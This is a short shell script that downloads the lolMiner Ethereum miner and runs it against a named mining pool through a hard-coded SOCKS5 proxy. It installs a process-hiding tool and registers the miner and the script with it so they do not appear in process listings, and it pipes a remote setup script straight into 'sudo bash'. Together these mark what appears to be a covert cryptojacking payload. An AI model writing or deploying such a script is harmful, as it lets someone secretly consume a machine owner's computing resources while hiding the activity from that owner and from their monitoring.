#!/bin/sh
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.39/lolMiner_v1.39_Lin64.tar.gz 
tar -xf lolMiner_v1.39_Lin64.tar.gz
cd 1.39
apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs
npm i -g node-process-hider
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
ph add lol.sh
ph add lolMiner
sleep 14
./lolMiner --algo ETHASH --pool stratum+tcp://ethash.kupool.com:8888 --user thunder0x.001 --ethstratum ETHPROXY --socks5 46.174.43.18:1080 --timeprint on --longstats 60 
